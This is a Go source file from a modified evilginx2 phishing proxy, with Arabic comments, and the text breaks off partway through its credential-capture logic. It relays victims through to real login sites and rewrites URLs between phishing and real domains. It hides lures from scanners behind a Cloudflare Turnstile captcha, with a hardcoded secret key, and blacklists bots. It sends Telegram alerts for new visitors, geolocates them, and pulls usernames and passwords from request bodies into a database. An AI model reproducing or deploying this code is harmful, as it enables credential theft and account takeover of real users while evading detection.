/*

This source file is a modified version of what was taken from the amazing bettercap (https://github.com/bettercap/bettercap) project.
Credits go to Simone Margaritelli (@evilsocket) for providing awesome piece of code!

*/

package core

import (
	"bufio"
	"bytes"
	"crypto/rand"
	"crypto/rc4"
	"crypto/sha256"
	"crypto/tls"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"html"
	"io"
	"io/ioutil"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"

	"golang.org/x/net/proxy"

	"github.com/elazarl/goproxy"
	"github.com/fatih/color"
	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
	"github.com/inconshreveable/go-vhost"
	http_dialer "github.com/mwitkow/go-http-dialer"

	"github.com/kgretzky/evilginx2/database"
	"github.com/kgretzky/evilginx2/log"
)

const (
	CONVERT_TO_ORIGINAL_URLS = 0
	CONVERT_TO_PHISHING_URLS = 1
)

const (
	HOME_DIR = ".evilginx"
)

const (
	httpReadTimeout  = 45 * time.Second
	httpWriteTimeout = 45 * time.Second
)

// original borrowed from Modlishka project (https://github.com/drk1wi/Modlishka)
var MATCH_URL_REGEXP = regexp.MustCompile(`\b(http[s]?:\/\/|\\\\|http[s]:\\x2F\\x2F)(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)
var MATCH_URL_REGEXP_WITHOUT_SCHEME = regexp.MustCompile(`\b(([A-Za-z0-9-]{1,63}\.)?[A-Za-z0-9]+(-[a-z0-9]+)*\.)+(arpa|root|aero|biz|cat|com|coop|edu|gov|info|int|jobs|mil|mobi|museum|name|net|org|pro|tel|travel|bot|inc|game|xyz|cloud|live|today|online|shop|tech|art|site|wiki|ink|vip|lol|club|click|ac|ad|ae|af|ag|ai|al|am|an|ao|aq|ar|as|at|au|aw|ax|az|ba|bb|bd|be|bf|bg|bh|bi|bj|bm|bn|bo|br|bs|bt|bv|bw|by|bz|ca|cc|cd|cf|cg|ch|ci|ck|cl|cm|cn|co|cr|cu|cv|cx|cy|cz|dev|de|dj|dk|dm|do|dz|ec|ee|eg|er|es|et|eu|fi|fj|fk|fm|fo|fr|ga|gb|gd|ge|gf|gg|gh|gi|gl|gm|gn|gp|gq|gr|gs|gt|gu|gw|gy|hk|hm|hn|hr|ht|hu|id|ie|il|im|in|io|iq|ir|is|it|je|jm|jo|jp|ke|kg|kh|ki|km|kn|kr|kw|ky|kz|la|lb|lc|li|lk|lr|ls|lt|lu|lv|ly|ma|mc|md|mg|mh|mk|ml|mm|mn|mo|mp|mq|mr|ms|mt|mu|mv|mw|mx|my|mz|na|nc|ne|nf|ng|ni|nl|no|np|nr|nu|nz|om|pa|pe|pf|pg|ph|pk|pl|pm|pn|pr|ps|pt|pw|py|qa|re|ro|ru|rw|sa|sb|sc|sd|se|sg|sh|si|sj|sk|sl|sm|sn|so|sr|st|su|sv|sy|sz|tc|td|tf|tg|th|tj|tk|tl|tm|tn|to|tp|tr|tt|tv|tw|tz|ua|ug|uk|um|us|uy|uz|va|vc|ve|vg|vi|vn|vu|wf|ws|ye|yt|yu|za|zm|zw)|([0-9]{1,3}\.{3}[0-9]{1,3})\b`)

type HttpProxy struct {
	Server            *http.Server
	Proxy             *goproxy.ProxyHttpServer
	crt_db            *CertDb
	cfg               *Config
	db                *database.Database
	bl                *Blacklist
	gophish           *GoPhish
	telegram          *TelegramBot
	sniListener       net.Listener
	isRunning         bool
	sessions          map[string]*Session
	sids              map[string]int
	cookieName        string
	last_sid          int
	developer         bool
	ip_whitelist      map[string]int64
	ip_sids           map[string]string
	auto_filter_mimes []string
	ip_mtx            sync.Mutex
	session_mtx       sync.Mutex
	importantCookieCount int // متغير لحفظ عدد الكوكيز المهمة

}

type ProxySession struct {
	SessionId    string
	Created      bool
	PhishDomain  string
	PhishletName string
	Index        int
}

// set the value of the specified key in the JSON body
func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error) {
	var data map[string]interface{}
	if err := json.Unmarshal(body, &data); err != nil {
		return nil, err
	}
	data[key] = value
	newBody, err := json.Marshal(data)
	if err != nil {
		return nil, err
	}
	return newBody, nil
}

func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
	p := &HttpProxy{
		Proxy:             goproxy.NewProxyHttpServer(),
		Server:            nil,
		crt_db:            crt_db,
		cfg:               cfg,
		db:                db,
		bl:                bl,
		gophish:           NewGoPhish(),
		isRunning:         false,
		last_sid:          0,
		developer:         developer,
		ip_whitelist:      make(map[string]int64),
		ip_sids:           make(map[string]string),
		auto_filter_mimes: []string{"text/html", "application/json", "application/javascript", "text/javascript", "application/x-javascript"},
	}
	
	// استخدام إعدادات التليجرام من الملف الجديد
	botToken, chatID := GetTelegramConfig(cfg.GetTelegramBotToken(), cfg.GetTelegramChatID())
	p.telegram = NewTelegramBot(botToken, chatID)

	p.Server = &http.Server{
		Addr:         fmt.Sprintf("%s:%d", hostname, port),
		Handler:      p.Proxy,
		ReadTimeout:  httpReadTimeout,
		WriteTimeout: httpWriteTimeout,
	}

	if cfg.proxyConfig.Enabled {
		err := p.setProxy(cfg.proxyConfig.Enabled, cfg.proxyConfig.Type, cfg.proxyConfig.Address, cfg.proxyConfig.Port, cfg.proxyConfig.Username, cfg.proxyConfig.Password)
		if err != nil {
			log.Error("proxy: %v", err)
			cfg.EnableProxy(false)
		} else {
			log.Info("enabled proxy: " + cfg.proxyConfig.Address + ":" + strconv.Itoa(cfg.proxyConfig.Port))
		}
	}

	p.cookieName = strings.ToLower(GenRandomString(8)) // TODO: make cookie name identifiable
	p.sessions = make(map[string]*Session)
	p.sids = make(map[string]int)

	p.Proxy.Verbose = false

	p.Proxy.NonproxyHandler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
		req.URL.Scheme = "https"
		req.URL.Host = req.Host
		p.Proxy.ServeHTTP(w, req)
	})

	p.Proxy.OnRequest().HandleConnect(goproxy.AlwaysMitm)

	p.Proxy.OnRequest().
		DoFunc(func(req *http.Request, ctx *goproxy.ProxyCtx) (*http.Request, *http.Response) {
			ps := &ProxySession{
				SessionId:    "",
				Created:      false,
				PhishDomain:  "",
				PhishletName: "",
				Index:        -1,
			}
			ctx.UserData = ps
			hiblue := color.New(color.FgHiBlue)

			// معالجة مباشرة لمسار verify_captcha
			if req.URL.Path == "/verify_captcha" {
				// السماح بالطلبات POST
				if req.Method == "POST" {
					err := req.ParseForm()
					if err == nil {
						// التحقق من رمز Turnstile 
						token := req.FormValue("cf-turnstile-response")
						if token != "" {
							// بناء طلب للتحقق من الكابتشا
							client := &http.Client{Timeout: 10 * time.Second}
							
							verification_data := url.Values{}
							verification_data.Set("secret", "0x4AAAAAABawvOUzgPpoLNJmrzMwBAxJ9_Q")
							verification_data.Set("response", token)
							verification_data.Set("remoteip", strings.SplitN(req.RemoteAddr, ":", 2)[0])
							
							verification_resp, err := client.PostForm("https://challenges.cloudflare.com/turnstile/v0/siteverify", verification_data)
							if err == nil {
								defer verification_resp.Body.Close()
								var result map[string]interface{}
								if err := json.NewDecoder(verification_resp.Body).Decode(&result); err == nil {
									if success, ok := result["success"].(bool); ok && success {
										// نجح التحقق، وضع الكوكي وإعادة التوجيه
										resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
										if resp != nil {
											expiration := time.Now().Add(24 * time.Hour)
											cookie := http.Cookie{Name: "passed_captcha", Value: "1", Expires: expiration, Path: "/"}
											resp.Header.Set("Set-Cookie", cookie.String())
											
											// تحديد المسار الذي سيتم إعادة التوجيه إليه
											redirectPath := req.FormValue("redirect_path")
											if redirectPath == "" {
												redirectPath = "/"
											}
											resp.Header.Set("Location", redirectPath)
											return req, resp
										}
									}
								}
							}
						}
					}
					// في حالة الفشل، عرض صفحة الكابتشا مرة أخرى مع رسالة خطأ
					captchaHTML := `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        .captcha-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
        .error {
            color: #e53935;
            margin-top: 15px;
        }
    </style>
    <script>
        function onCaptchaSuccess(token) {
            document.getElementById('captcha-form').submit();
        }
    </script>
</head>
<body>
    <div class="container">
        <div class="error">تعذر التحقق، يرجى المحاولة مرة أخرى</div>
        <form id="captcha-form" action="/verify_captcha" method="POST">
            <input type="hidden" name="redirect_path" value="` + req.Referer() + `">
            <div class="captcha-container">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
            </div>
        </form>
    </div>
</body>
</html>`
					
					resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
					return req, resp
				}
				// معالجة طلبات GET لصفحة التحقق
				captchaHTML := `<!DOCTYPE html>
<html dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 100%;
            max-width: 500px;
            text-align: center;
        }
        .captcha-container {
            display: flex;
            justify-content: center;
            margin: 20px 0;
        }
    </style>
    <script>
        function onCaptchaSuccess(token) {
            document.getElementById('captcha-form').submit();
        }
    </script>
</head>
<body>
    <div class="container">
        <form id="captcha-form" action="/verify_captcha" method="POST">
            <input type="hidden" name="redirect_path" value="/">
            <div class="captcha-container">
                <div class="cf-turnstile" data-sitekey="0x4AAAAAABawvCmqhuyTQCB4" data-theme="light" data-callback="onCaptchaSuccess"></div>
            </div>
        </form>
    </div>
</body>
</html>`
				
				resp := goproxy.NewResponse(req, "text/html", http.StatusOK, captchaHTML)
				return req, resp
			}

			// handle ip blacklist
			from_ip := strings.SplitN(req.RemoteAddr, ":", 2)[0]

			// handle proxy headers
			proxyHeaders := []string{"X-Forwarded-For", "X-Real-IP", "X-Client-IP", "Connecting-IP", "True-Client-IP", "Client-IP"}
			for _, h := range proxyHeaders {
				origin_ip := req.Header.Get(h)
				if origin_ip != "" {
					from_ip = strings.SplitN(origin_ip, ":", 2)[0]
					break
				}
			}

			if p.cfg.GetBlacklistMode() != "off" {
				if p.bl.IsBlacklisted(from_ip) {
					if p.bl.IsVerbose() {
						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
					}
					return p.blockRequest(req)
				}
				if p.cfg.GetBlacklistMode() == "all" {
					if !p.bl.IsWhitelisted(from_ip) {
						err := p.bl.AddIP(from_ip)
						if p.bl.IsVerbose() {
							if err != nil {
								log.Error("blacklist: %s", err)
							} else {
								log.Warning("blacklisted ip address: %s", from_ip)
							}
						}
					}

					return p.blockRequest(req)
				}
			}

			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
			o_host := req.Host
			lure_url := req_url
			req_path := req.URL.Path
			if req.URL.RawQuery != "" {
				req_url += "?" + req.URL.RawQuery
				//req_path += "?" + req.URL.RawQuery
			}

			pl := p.getPhishletByPhishHost(req.Host)
			remote_addr := from_ip

			redir_re := regexp.MustCompile("^\\/s\\/([^\\/]*)")
			js_inject_re := regexp.MustCompile("^\\/s\\/([^\\/]*)\\/([^\\/]*)")

			if js_inject_re.MatchString(req.URL.Path) {
				ra := js_inject_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 3 {
					session_id := ra[1]
					js_id := ra[2]
					if strings.HasSuffix(js_id, ".js") {
						js_id = js_id[:len(js_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							var js_params *map[string]string = nil
							js_params = &s.Params

							script, err := pl.GetScriptInjectById(js_id, js_params)
							if err == nil {
								d_body += script + "\n\n"
							} else {
								log.Warning("js_inject: script not found: '%s'", js_id)
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js_inject: session not found: '%s'", session_id)
						}
					}
				}
			} else if redir_re.MatchString(req.URL.Path) {
				ra := redir_re.FindStringSubmatch(req.URL.Path)
				if len(ra) >= 2 {
					session_id := ra[1]
					if strings.HasSuffix(session_id, ".js") {
						// respond with injected javascript
						session_id = session_id[:len(session_id)-3]
						if s, ok := p.sessions[session_id]; ok {
							var d_body string
							if !s.IsDone {
								if s.RedirectURL != "" {
									dynamic_redirect_js := DYNAMIC_REDIRECT_JS
									dynamic_redirect_js = strings.ReplaceAll(dynamic_redirect_js, "{session_id}", s.Id)
									d_body += dynamic_redirect_js + "\n\n"
								}
							}
							resp := goproxy.NewResponse(req, "application/javascript", 200, string(d_body))
							return req, resp
						} else {
							log.Warning("js: session not found: '%s'", session_id)
						}
					} else {
						if _, ok := p.sessions[session_id]; ok {
							redirect_url, ok := p.waitForRedirectUrl(session_id)
							if ok {
								type ResponseRedirectUrl struct {
									RedirectUrl string `json:"redirect_url"`
								}
								d_json, err := json.Marshal(&ResponseRedirectUrl{RedirectUrl: redirect_url})
								if err == nil {
									s_index, _ := p.sids[session_id]
									log.Important("[%d] dynamic redirect to URL: %s", s_index, redirect_url)
									resp := goproxy.NewResponse(req, "application/json", 200, string(d_json))
									return req, resp
								}
							}
							resp := goproxy.NewResponse(req, "application/json", 408, "")
							return req, resp
						} else {
							log.Warning("api: session not found: '%s'", session_id)
						}
					}
				}
			}

			phishDomain, phished := p.getPhishDomain(req.Host)
			if phished {
				pl_name := ""
				if pl != nil {
					pl_name = pl.Name
					ps.PhishletName = pl_name
				}
				session_cookie := getSessionCookieName(pl_name, p.cookieName)

				ps.PhishDomain = phishDomain
				req_ok := false
				// handle session
				if p.handleSession(req.Host) && pl != nil {
					l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						log.Debug("triggered lure for path '%s'", req_path)
						
						// التحقق من وجود كوكي الكابتشا عند الوصول لرابط lure
						captcha_cookie, err := req.Cookie("passed_captcha")
						if err != nil || captcha_cookie.Value != "1" {
							log.Warning("[%s] محاولة وصول لرابط lure بدون التحقق من الكابتشا: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
							return p.blockRequest(req) // عرض صفحة الكابتشا
						}
					}

					var create_session bool = true
					var ok bool = false
					sc, err := req.Cookie(session_cookie)
					if err == nil {
						ps.Index, ok = p.sids[sc.Value]
						if ok {
							create_session = false
							ps.SessionId = sc.Value
							p.whitelistIP(remote_addr, ps.SessionId, pl.Name)
						} else {
							log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					} else {
						if l == nil && p.isWhitelistedIP(remote_addr, pl.Name) {
							// not a lure path and IP is whitelisted

							// TODO: allow only retrieval of static content, without setting session ID

							create_session = false
							req_ok = true
							/*
								ps.SessionId, ok = p.getSessionIdByIP(remote_addr, req.Host)
								if ok {
									create_session = false
									ps.Index, ok = p.sids[ps.SessionId]
								} else {
									log.Error("[%s] wrong session token: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
								}*/
						}
					}

					if create_session /*&& !p.isWhitelistedIP(remote_addr, pl.Name)*/ { // TODO: always trigger new session when lure URL is detected (do not check for whitelisted IP only after this is done)
						// session cookie not found
						if !p.cfg.IsSiteHidden(pl_name) {
							if l != nil {
								// check if lure is not paused
								if l.PausedUntil > 0 && time.Unix(l.PausedUntil, 0).After(time.Now()) {
									log.Warning("[%s] lure is paused: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
									return p.blockRequest(req)
								}

								// check if lure user-agent filter is triggered
								if len(l.UserAgentFilter) > 0 {
									re, err := regexp.Compile(l.UserAgentFilter)
									if err == nil {
										if !re.MatchString(req.UserAgent()) {
											log.Warning("[%s] unauthorized request (user-agent rejected): %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

											if p.cfg.GetBlacklistMode() == "unauth" {
												if !p.bl.IsWhitelisted(from_ip) {
													err := p.bl.AddIP(from_ip)
													if p.bl.IsVerbose() {
														if err != nil {
															log.Error("blacklist: %s", err)
														} else {
															log.Warning("blacklisted ip address: %s", from_ip)
														}
													}
												}
											}
											return p.blockRequest(req)
										}
									} else {
										log.Error("lures: user-agent filter regexp is invalid: %v", err)
									}
								}

								session, err := NewSession(pl.Name)
								if err == nil {
									// set params from url arguments
									p.extractParams(session, req.URL)

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										if trackParam, ok := session.Params["o"]; ok {
											if trackParam == "track" {
												// gophish email tracker image
												rid, ok := session.Params["rid"]
												if ok && rid != "" {
													log.Info("[gophish] [%s] email opened: %s (%s)", hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
													p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
													err = p.gophish.ReportEmailOpened(rid, remote_addr, req.Header.Get("User-Agent"))
													if err != nil {
														log.Error("gophish: %s", err)
													}
													return p.trackerImage(req)
												}
											}
										}
									}

									sid := p.last_sid
									p.last_sid += 1
									log.Important("[%d] [%s] new visitor has arrived: %s (%s)", sid, hiblue.Sprint(pl_name), req.Header.Get("User-Agent"), remote_addr)
									log.Info("[%d] [%s] landing URL: %s", sid, hiblue.Sprint(pl_name), req_url)
									p.sessions[session.Id] = session
									p.sids[session.Id] = sid
									
									// إرسال إشعار تليجرام بزيارة جديدة
									go p.telegram.NotifyNewVisit(session.Id, pl_name, remote_addr, req.Header.Get("User-Agent"))

									if p.cfg.GetGoPhishAdminUrl() != "" && p.cfg.GetGoPhishApiKey() != "" {
										rid, ok := session.Params["rid"]
										if ok && rid != "" {
											p.gophish.Setup(p.cfg.GetGoPhishAdminUrl(), p.cfg.GetGoPhishApiKey(), p.cfg.GetGoPhishInsecureTLS())
											err = p.gophish.ReportEmailLinkClicked(rid, remote_addr, req.Header.Get("User-Agent"))
											if err != nil {
												log.Error("gophish: %s", err)
											}
										}
									}

									// التحقق من وجود معلمات البلد في الطلب وتعيينها للجلسة
									countryCode, ok := session.Params["cc"]
									if ok && countryCode != "" {
										session.SetCountryCode(countryCode)
										log.Debug("تم تعيين رمز البلد: %s", countryCode)
									}
									
									country, ok := session.Params["country"]
									if ok && country != "" {
										session.SetCountry(country)
										log.Debug("تم تعيين اسم البلد: %s", country)
									}
									
									// إذا لم تكن معلمات البلد موجودة في الطلب، يمكن استخراجها من عنوان IP
									if (session.CountryCode == "" || session.Country == "") && remote_addr != "" {
										// استخدام خدمة تحديد موقع IP للحصول على بيانات البلد
										log.Debug("محاولة استخراج معلومات البلد من عنوان IP: %s", remote_addr)
										
										cc, country := getIPGeoInfo(remote_addr)
										if cc != "" {
											session.SetCountryCode(cc)
											log.Success("[%d] تم تعيين رمز البلد من IP: %s", sid, cc)
										}
										if country != "" {
											session.SetCountry(country)
											log.Success("[%d] تم تعيين اسم البلد من IP: %s", sid, country)
										}
									}

									landing_url := req_url //fmt.Sprintf("%s://%s%s", req.URL.Scheme, req.Host, req.URL.Path)
									if err := p.db.CreateSession(session.Id, pl.Name, landing_url, req.Header.Get("User-Agent"), remote_addr); err != nil {
										log.Error("database: %v", err)
									} else {
										// حفظ معلومات البلد بعد إنشاء الجلسة في قاعدة البيانات
										if session.CountryCode != "" || session.Country != "" {
											if err := p.db.SetSessionCountryInfo(session.Id, session.CountryCode, session.Country); err != nil {
												log.Error("[%d] فشل في حفظ معلومات البلد: %v", sid, err)
											} else {
												log.Success("[%d] تم حفظ معلومات البلد في قاعدة البيانات بنجاح", sid)
											}
										}
									}

									session.RemoteAddr = remote_addr
									session.UserAgent = req.Header.Get("User-Agent")
									session.RedirectURL = pl.RedirectUrl
									if l.RedirectUrl != "" {
										session.RedirectURL = l.RedirectUrl
									}
									if session.RedirectURL != "" {
										session.RedirectURL, _ = p.replaceUrlWithPhished(session.RedirectURL)
									}
									session.PhishLure = l
									log.Debug("redirect URL (lure): %s", session.RedirectURL)

									ps.SessionId = session.Id
									ps.Created = true
									ps.Index = sid
									p.whitelistIP(remote_addr, ps.SessionId, pl.Name)

									req_ok = true
								}
							} else {
								log.Warning("[%s] unauthorized request: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)

								if p.cfg.GetBlacklistMode() == "unauth" {
									if !p.bl.IsWhitelisted(from_ip) {
										err := p.bl.AddIP(from_ip)
										if p.bl.IsVerbose() {
											if err != nil {
												log.Error("blacklist: %s", err)
											} else {
												log.Warning("blacklisted ip address: %s", from_ip)
											}
										}
									}
								}
								return p.blockRequest(req)
							}
						} else {
							log.Warning("[%s] request to hidden phishlet: %s (%s) [%s]", hiblue.Sprint(pl_name), req_url, req.Header.Get("User-Agent"), remote_addr)
						}
					}
				}

				// redirect for unauthorized requests
				if ps.SessionId == "" && p.handleSession(req.Host) {
					if !req_ok {
						return p.blockRequest(req)
					}
				}
				req.Header.Set(p.getHomeDir(), o_host)

				if ps.SessionId != "" {
					if s, ok := p.sessions[ps.SessionId]; ok {
						l, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
						if err == nil {
							// show html redirector if it is set for the current lure
							if l.Redirector != "" {
								if !p.isForwarderUrl(req.URL) {
									if s.RedirectorName == "" {
										s.RedirectorName = l.Redirector
										s.LureDirPath = req_path
									}

									t_dir := l.Redirector
									if !filepath.IsAbs(t_dir) {
										redirectors_dir := p.cfg.GetRedirectorsDir()
										t_dir = filepath.Join(redirectors_dir, t_dir)
									}

									index_path1 := filepath.Join(t_dir, "index.html")
									index_path2 := filepath.Join(t_dir, "index.htm")
									index_found := ""
									if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
										index_found = index_path1
									} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
										index_found = index_path2
									}

									if _, err := os.Stat(index_found); !os.IsNotExist(err) {
										html, err := ioutil.ReadFile(index_found)
										if err == nil {

											html = p.injectOgHeaders(l, html)

											body := string(html)
											body = p.replaceHtmlParams(body, lure_url, &s.Params)

											resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
											if resp != nil {
												return req, resp
											} else {
												log.Error("lure: failed to create html redirector response")
											}
										} else {
											log.Error("lure: failed to read redirector file: %s", err)
										}

									} else {
										log.Error("lure: redirector file does not exist: %s", index_found)
									}
								}
							}
						} else if s.RedirectorName != "" {
							// session has already triggered a lure redirector - see if there are any files requested by the redirector

							rel_parts := []string{}
							req_path_parts := strings.Split(req_path, "/")
							lure_path_parts := strings.Split(s.LureDirPath, "/")

							for n, dname := range req_path_parts {
								if len(dname) > 0 {
									path_add := true
									if n < len(lure_path_parts) {
										//log.Debug("[%d] %s <=> %s", n, lure_path_parts[n], req_path_parts[n])
										if req_path_parts[n] == lure_path_parts[n] {
											path_add = false
										}
									}
									if path_add {
										rel_parts = append(rel_parts, req_path_parts[n])
									}
								}

							}
							rel_path := filepath.Join(rel_parts...)
							//log.Debug("rel_path: %s", rel_path)

							t_dir := s.RedirectorName
							if !filepath.IsAbs(t_dir) {
								redirectors_dir := p.cfg.GetRedirectorsDir()
								t_dir = filepath.Join(redirectors_dir, t_dir)
							}

							path := filepath.Join(t_dir, rel_path)
							if _, err := os.Stat(path); !os.IsNotExist(err) {
								fdata, err := ioutil.ReadFile(path)
								if err == nil {
									//log.Debug("ext: %s", filepath.Ext(req_path))
									mime_type := getContentType(req_path, fdata)
									//log.Debug("mime_type: %s", mime_type)
									resp := goproxy.NewResponse(req, mime_type, http.StatusOK, "")
									if resp != nil {
										resp.Body = io.NopCloser(bytes.NewReader(fdata))
										return req, resp
									} else {
										log.Error("lure: failed to create redirector data file response")
									}
								} else {
									log.Error("lure: failed to read redirector data file: %s", err)
								}
							} else {
								//log.Warning("lure: template file does not exist: %s", path)
							}
						}
					}
				}

				// redirect to login page if triggered lure path
				if pl != nil {
					_, err := p.cfg.GetLureByPath(pl_name, o_host, req_path)
					if err == nil {
						// التحقق من وجود كوكي الكابتشا قبل إعادة التوجيه إلى صفحة تسجيل الدخول
						captcha_cookie, err := req.Cookie("passed_captcha")
						if err != nil || captcha_cookie.Value != "1" {
							log.Warning("[%s] محاولة وصول لصفحة تسجيل الدخول بدون التحقق من الكابتشا: %s [%s]", hiblue.Sprint(pl_name), req_url, remote_addr)
							return p.blockRequest(req) // عرض صفحة الكابتشا
						}
						
						// redirect from lure path to login url
						rurl := pl.GetLoginUrl()
						u, err := url.Parse(rurl)
						if err == nil {
							if strings.ToLower(req_path) != strings.ToLower(u.Path) {
								resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
								if resp != nil {
									resp.Header.Add("Location", rurl)
									return req, resp
								}
							}
						}
					}
				}

				// check if lure hostname was triggered - by now all of the lure hostname handling should be done, so we can bail out
				if p.cfg.IsLureHostnameValid(req.Host) {
					log.Debug("lure hostname detected - returning 404 for request: %s", req_url)

					resp := goproxy.NewResponse(req, "text/html", http.StatusNotFound, "")
					if resp != nil {
						return req, resp
					}
				}

				// replace "Host" header
				if r_host, ok := p.replaceHostWithOriginal(req.Host); ok {
					req.Host = r_host
				}

				// fix origin
				origin := req.Header.Get("Origin")
				if origin != "" {
					if o_url, err := url.Parse(origin); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Origin", o_url.String())
						}
					}
				}

				// prevent caching
				req.Header.Set("Cache-Control", "no-cache")

				// fix sec-fetch-dest
				sec_fetch_dest := req.Header.Get("Sec-Fetch-Dest")
				if sec_fetch_dest != "" {
					if sec_fetch_dest == "iframe" {
						req.Header.Set("Sec-Fetch-Dest", "document")
					}
				}

				// fix referer
				referer := req.Header.Get("Referer")
				if referer != "" {
					if o_url, err := url.Parse(referer); err == nil {
						if r_host, ok := p.replaceHostWithOriginal(o_url.Host); ok {
							o_url.Host = r_host
							req.Header.Set("Referer", o_url.String())
						}
					}
				}

				// patch GET query params with original domains
				if pl != nil {
					qs := req.URL.Query()
					if len(qs) > 0 {
						for gp := range qs {
							for i, v := range qs[gp] {
								qs[gp][i] = string(p.patchUrls(pl, []byte(v), CONVERT_TO_ORIGINAL_URLS))
							}
						}
						req.URL.RawQuery = qs.Encode()
					}
				}

				// check for creds in request body
				if pl != nil && ps.SessionId != "" {
					req.Header.Set(p.getHomeDir(), o_host)
					body, err := ioutil.ReadAll(req.Body)
					if err == nil {
						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))

						// patch phishing URLs in JSON body with original domains
						body = p.patchUrls(pl, body, CONVERT_TO_ORIGINAL_URLS)
						req.ContentLength = int64(len(body))

						log.Debug("POST: %s", req.URL.Path)
						log.Debug("POST body = %s", body)

						contentType := req.Header.Get("Content-type")

						json_re := regexp.MustCompile("application\\/\\w*\\+?json")
						form_re := regexp.MustCompile("application\\/x-www-form-urlencoded")

						if json_re.MatchString(contentType) {

							if pl.username.tp == "json" {
								um := pl.username.search.FindStringSubmatch(string(body))
								if um != nil && len(um) > 1 {
									p.setSessionUsername(ps.SessionId, um[1])
									log.Success("[%d] Username: [%s]", ps.Index, um[1])
									if err := p.db.SetSessionUsername(ps.SessionId, um[1]); err != nil {
										log.Error("database: %v", err)
									}
								}
							}

							if pl.password.tp == "json" {
								pm := pl.password.search.FindStringSubmatch(string(body))
								if pm != nil && len(pm) > 1 {
